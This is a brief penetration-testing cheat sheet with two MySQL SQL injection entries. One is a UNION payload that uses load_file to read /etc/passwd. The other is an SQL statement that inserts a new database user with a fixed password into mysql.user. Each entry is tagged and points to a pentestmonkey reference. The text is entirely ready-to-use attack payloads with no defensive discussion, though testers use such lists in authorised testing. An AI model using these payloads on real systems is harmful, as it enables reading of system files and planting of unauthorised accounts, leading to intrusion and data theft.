### 1. Load a file with MYSQL
```
null union all select load_file('/etc/passwd')/*
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheets
__________
### 2. mysql add user
```
insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
__________
